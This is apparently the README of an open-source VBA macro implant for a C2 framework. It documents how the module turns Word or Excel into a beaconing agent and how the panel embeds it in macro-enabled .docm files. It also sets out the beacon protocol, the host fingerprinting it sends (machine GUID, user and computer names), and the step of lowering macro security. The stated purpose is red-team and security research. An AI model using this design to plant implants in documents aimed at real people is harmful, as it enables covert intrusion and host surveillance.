# vba-agent

The **VBA HTTP-beacon agent** for the
[C2](https://github.com/nostdlib/c2) platform — the Office-macro sibling of
[jscript-agent](https://github.com/nostdlib/jscript-agent),
[powershell-agent](https://github.com/nostdlib/powershell-agent) and
[python-agent](https://github.com/nostdlib/python-agent).

One static standard module, [`src/vba-agent.bas`](src/vba-agent.bas): import
it into any Office VBA project (or let a generator build the document around
it) and the host process — WINWORD.EXE, EXCEL.EXE, any VBA host — becomes an
implant that dials the panel over the same v3 beacon wire as every other
breed. No typelib references, no host customization: one `kernel32` declare
(`Sleep`, `PtrSafe`-guarded for VBA7) and everything else is late-bound
`CreateObject`/`GetObject` COM.

- **Breed id:** `6` (`X-Client-Id: 6`)
- **Capability mask:** `0000000000000000` — v1 ships no upgrade arm and no
  shell/filesystem categories, so the mask is honestly empty (the Python
  agent ships the same shape). Exit (0x0A) is a core command and needs no
  bit; every other opcode is answered with status 2 — never silence.
- **Requires:** Office 2007 or later, 32-bit or 64-bit, Windows.

> **Authorized red-team use and security research only** — see
> [RESPONSIBLE_USE.md](RESPONSIBLE_USE.md) before touching any of this.

---

## Beacon URL contract

The module carries **no baked config**. The beacon URL — the bare listener
origin, e.g. `http://c2.example.net:5001` — arrives on two channels, in
priority order:

1. **The call argument** — the host master's channel:
   `result = RunAgent("http://c2.example.net:5001")`.
2. **The `H_URL` environment variable** — fallback, and only a var the
   host process **inherited at start** (`set H_URL=...` before launching
   the Office binary). VBA `Environ` reads the environment block as it
   existed when the VBA runtime initialized; a var written at RUN time into
   the same process (`WScript.Shell.Environment("Process")`,
   `SetEnvironmentVariable`) is **invisible** to it — which is why the URL
   rides the call.

With neither channel carrying a URL, `RunAgent` returns `"fail"`
immediately and silently (the log is inert before identity exists — exactly
how the siblings behave).

## Host contract

The module defines exactly **one public symbol** — `Public Function
RunAgent(Optional ByVal beaconUrl As String = "") As String`. Everything
else is `Private`. The module name is
`C2Agent`.

| Return | Meaning |
|---|---|
| `"exit"` | The C2 sent `0x0A`; the run ended cleanly (Exit gets no reply). |
| `"fail"` | The beacon failed — no beacon URL on either channel, transport dead, non-200 answer. Failure is **fatal**: one cycle, no retry. The caller decides what a dead beacon means. |
| `"busy"` | `RunAgent` was re-entered while a loop is already running. |

**The host owns everything outside the module.** The agent never touches
windows, processes, persistence or documents — that is the host master's
job. The only process-global side effect is the inherited `H_URL` read
(the call argument is not a process-global at all) plus the module's own
state.

Two host-coupling notes:

- **The DoEvents pump.** The 25–35 s answer hold IS the agent's only idle
  sleep, and VBA runs on the host's one STA thread — a synchronous
  `ServerXMLHTTP` call would freeze the Office window into "not responding"
  every cycle. The beacon is therefore sent **async** and pumped
  (`DoEvents` + `Sleep 50` while `readyState <> 4`, 90 s wrap-safe
  deadline). The Office UI stays alive; the same restructure the JScript
  agent makes for mshta's windowed host.
- **Re-entrancy.** That pump makes re-entry reachable — a host firing
  another macro mid-hold re-enters `RunAgent`. An `mRunning` module flag
  turns the second call into `"busy"` instead of a second beacon loop.

## Beacon contract (v3)

One POST per cycle to `H_URL`:

- **Request:** `MSXML2.ServerXMLHTTP` (WinHTTP-backed — ignores IE URL-zone
  security, which plain `XMLHTTP` does not; the same reason the C2's dotm
  template picks it). `POST`, async, timeouts resolve/connect/send/receive
  = 10/10/15/45 s applied after `Open`.
- **Request headers:** the identity block (below) on every post. Log ships
  add `X-Log-Only: 1`.
- **Request body:** the owed reply frames as repeated `[u32le len][bytes]`;
  an empty body is a plain idle beacon. `responseBody` is a **native
  `Byte()` safearray** — no ADODB stream / codepage bridge needed (unlike
  JScript, VBA has real bytes).
- **Response:** always HTTP 200 — a held 25–35 s answer with queued command
  frames, or an immediate empty one. The agent gates on
  **`Content-Length`**, never on the body: absent header = nothing queued,
  body untouched.
- **Failure is fatal:** non-200 or a dead transport → `"fail"`, no retry.

Logging goes to the C2 only (`X-Log-Only: 1`, UTF-8-ish log lines as body
frames; the C2 answers immediately, no hold). Ships are async
fire-and-forget, retained in a collection (cap 3) so a released MSXML
object doesn't abort its own in-flight send, reaped per cycle. There is no
local echo — no `Debug.Print`, no MsgBox.

## Identity (API version 1)

Session-static headers derived once per `RunAgent(...)` call; **optional**
headers are omitted when undetected, never sent empty:

| Header | Value |
|---|---|
| `X-Api-Version` | `1` |
| `X-Platform` | `Windows` |
| `X-Client-Id` | `6` |
| `X-Client-Features` | `0000000000000000` |
| `X-Device-Id` | MachineGuid, canonical x86 view — see below |
| `X-Session-Id` | Random per-run key (`Scriptlet.TypeLib` GUID, Rnd-hex fallback) |
| `X-Device-Name` | `COMPUTERNAME` |
| `X-User-Id` | `USERNAME` |
| `X-Device-Arch` / `X-App-Arch` | OS arch / process arch (`i386`, `x86_64`, `aarch64`) |
| `X-OS-Version` / `X-OS-Build` | WMI `Win32_OperatingSystem` |

**Device id derivation** — the same chain the sibling breeds run; every
breed must derive the SAME id or one machine mints two agent rows:

1. `StdRegProv.GetStringValue` of `MachineGuid` — StdRegProv serves the
   **native** registry view regardless of caller bitness, so the canonical
   x86-view copy is read through its explicit
   `SOFTWARE\Wow6432Node\Microsoft\Cryptography` path on a 64-bit OS (a
   32-bit host's redirected default view IS that copy). 32-bit OSes: the
   default path is the only view.
2. Default view — the ARM64 edge where nothing keys the x86-view copy.
3. `WScript.Shell.RegRead` (registry redirection applies to this caller).
4. SMBIOS `Win32_ComputerSystemProduct.UUID` (all-zero rejected).
5. Nothing — the header is **omitted** and the C2 fills its derived-uuid
   fallback. Never a zero GUID: that is a valid-*shaped* value that would
   key one shared phantom row for every machine where detection failed.

> The C2 panel knows this breed end to end: the bundled `VBA-Agent` row
> (tagged `vba`) in its Agents table, `GetVbaAgentAsync` fetching this file
> at generation time, and the DOCX panel's **VBA Agent** tab packing it
> verbatim into a two-module `.docm` behind a ThisDocument host master (the
> panel's `docs/16` tells the C2 side).

## Commands

| Opcode | Name | Behavior |
|---|---|---|
| `0x0A` | Exit | Set the flag, reply **nothing**, unwind — `RunAgent` returns `"exit"`. |
| any other | — | Status `2` reply (unsupported), corrId echoed. |

Replies are `[status:u32le][corrId:u32le]`. The corrId is echoed as **raw
copied bytes** — no integer math anywhere near it: a u32 can exceed VBA's
`Long`, and any round trip through a number would corrupt the id the C2
claims the reply by.

## CI

GitHub runners have no Office, so VBA cannot be executed in CI — the
workflow runs **static contract checks** on the module instead:

- pure ASCII, no BOM (the VBE imports ANSI/ASCII sources),
- no line over VBA's hard 1023-char limit,
- the `Public Function RunAgent(` contract needle,
- exactly one public symbol,
- balanced `Sub`/`End Sub` and `Function`/`End Function` blocks,
- well-formed YAML (the workflows parse with actionlint).

`main` publishes a rolling **preview** release; `v*` tags publish tagged
ones. Both attach `vba-agent.bas`.

## Local verification

Real verification needs a real Office host:

1. Word: File → Options → Trust Center → Trust Center Settings → Macro
   Settings → enable macros + *Trust access to the VBA project object
   model* (or lower macro security on a disposable VM).
2. Open the VBE (Alt+F11) → File → **Import File…** → `vba-agent.bas`.
3. Immediate window, no listener: `? RunAgent("http://127.0.0.1:9/x")`
   → `"fail"` after the transport timeouts (nothing dials there). With
   neither argument nor an inherited `H_URL` → `"fail"` immediately and
   silently. Against the panel: the beacon appears, then
   `? RunAgent("https://<listener>")` blocks in its hold loop while the
   machine lands in the roster; send `Exit` from the panel → `"exit"`.

The C2's own `DotmGenerator` is the panel-side acceptance path for
documents embedding this module: a structure oracle (`AutomationSecurity=3`
+ `AccessVBOM`) plus a live beacon gate that runs the generated `.docm`
with macros enabled against a local listener and requires the POST.

## For defenders

See [DEFENSE.md](DEFENSE.md) — network and host indicators, MITRE mapping,
triage checklist.

## License

[MIT](LICENSE) — © 2025 mrzaxaryan
